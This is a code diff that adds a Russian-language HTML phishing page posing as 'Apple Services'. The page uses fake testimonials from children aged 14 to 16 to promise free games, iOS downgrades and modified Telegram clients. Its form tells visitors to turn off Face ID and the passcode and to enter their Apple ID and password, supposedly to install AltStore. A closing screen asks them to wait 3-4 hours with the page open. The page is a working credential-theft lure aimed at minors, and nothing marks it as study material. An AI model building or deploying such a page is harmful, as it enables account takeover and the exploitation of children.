@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apple Services</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <h1>Обновитесь до новейших возможностей</h1>
+        <p>Тысячи подростков и детей уже получили доступ к эксклюзивным функциям:</p>
+        <div class="reviews">
+            <div class="review">«Получил Minecraft, FNAF, Nulls Brawl бесплатно!» — Антон, 14 лет</div>
+            <div class="review">«Сделал откат с iOS 26 на 18, 17, 16 без проблем» — Мария, 16 лет</div>
+            <div class="review">«Ayugram и Doxgram работают идеально» — Дима, 15 лет</div>
+        </div>
+        <button id="moreBtn" class="apple-button">Подробнее</button>
+    </div>
+
+    <!-- Модальное окно для выбора опции (изначально скрыто) -->
+    <div id="optionsModal" class="modal">
+        <div class="modal-content">
+            <h2>Что вам нужно?</h2>
+            <div class="options">
+                <div class="option" data-option="ayugram">Ayugram / Doxgram</div>
+                <div class="option" data-option="games">Minecraft, FNAF, Nulls Brawl</div>
+                <div class="option" data-option="downgrade">Откат с iOS 26 на 18/17/16</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Форма для сценария 1 (изначально скрыта) -->
+    <div id="formModal" class="modal">
+        <div class="modal-content">
+            <h2>Для продолжения выполните подготовку</h2>
+            <p>Шаг 1: Полностью отключите Face ID и код-пароль в настройках iPhone.</p>
+            <p>Шаг 2: Введите данные iCloud:</p>
+            <input type="email" id="appleId" placeholder="Apple ID (почта)" required>
+            <input type="password" id="password" placeholder="Пароль" required>
+            <p>Шаг 3: Выберите модель устройства:</p>
+            <select id="deviceModel">
+                <option>iPhone 14 Pro</option>
+                <option>iPhone 15</option>
+                <option>iPhone 16</option>
+                <option>iPad Pro</option>
+                <option>iPad Air</option>
+            </select>
+            <p class="info-text">Мы требуем эти данные, чтобы скачать на ваше устройство AltStore. 
+                <span class="info-link" onclick="window.open('https://www.youtube.com/results?search_query=AltStore')">Что такое AltStore? (поищи на YouTube)</span>
+            </p>
+            <button id="submitBtn" class="apple-button">Отправить</button>
+        </div>
+    </div>
+
+    <!-- Сообщение об ожидании после отправки -->
+    <div id="waitingModal" class="modal">
+        <div class="modal-content">
+            <h2>Процесс запущен</h2>
+            <p>Пожалуйста, подождите 3-4 часа для завершения установки. Это необходимо для стабильной работы.</p>
+            <p>Не закрывайте страницу и не выключайте интернет.</p>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
